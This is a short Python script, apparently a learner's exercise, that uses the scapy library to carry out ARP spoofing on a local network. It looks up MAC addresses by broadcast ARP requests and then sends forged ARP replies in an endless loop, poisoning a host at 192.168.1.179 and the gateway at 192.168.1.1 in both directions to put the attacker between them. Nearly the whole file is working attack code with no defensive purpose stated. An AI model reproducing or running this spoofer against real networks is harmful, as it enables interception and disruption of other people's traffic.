import scapy.all as scapy
import time
import argparse
import time
import os
import sys

#WORK ONLY ON LINUX#
'''
This code is represnting ARP spoofer
It means that the user pretend to be another
IP address and by that can cancel the communication of 
one IP address with another
'''
def get_mac(ip):
    '''
    This function get list of mac addresses
    We need the mac address to pretend to be someone else
    and we choose our target by mac address aswell
    The function works by arp request ->
    we broadcast an arp request on the network and waiting
    for an answers from the devices on the same network
    '''
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast,timeout=1,verbose=False)[0]
    return (answered_list[0][1].hwsrc)


def spoof(target_ip,spoof_ip):
    '''
    This function is spoofing and sending an ARP 
    packet that we change our IP and pretend to be the IP that we want to fake
    For e.g , i want to be the router of the network so i will set the target mac address
    that i want to arp and ill put myself as the router IP -> broadcast.
    '''
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)
    scapy.send(packet)

while True:
    spoof("192.168.1.179","192.168.1.1")
    spoof("192.168.1.1","192.168.1.179")
    time.sleep(2)